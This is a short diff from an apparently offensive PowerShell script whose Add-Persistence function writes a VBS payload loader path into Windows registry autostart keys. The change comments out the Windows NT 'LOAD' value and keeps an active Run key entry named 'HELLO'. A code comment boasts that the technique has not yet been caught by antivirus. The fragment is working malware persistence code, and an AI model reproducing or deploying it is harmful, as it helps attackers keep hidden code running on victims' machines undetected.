@@ -59,7 +59,7 @@ function Add-Persistence()
 	
 	# Set the LOAD key. Haven't been caught by AV yet. ;-)
 	Write-Host "[+] Updating registry with a LOAD key"
-	Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name LOAD -Value $payloadvbsloaderpath
+	#Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name LOAD -Value $payloadvbsloaderpath
 	Set-ItemProperty -Path "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\" -Name HELLO -Value $payloadvbsloaderpath
 	Write-Host "[+] Done!"
 }
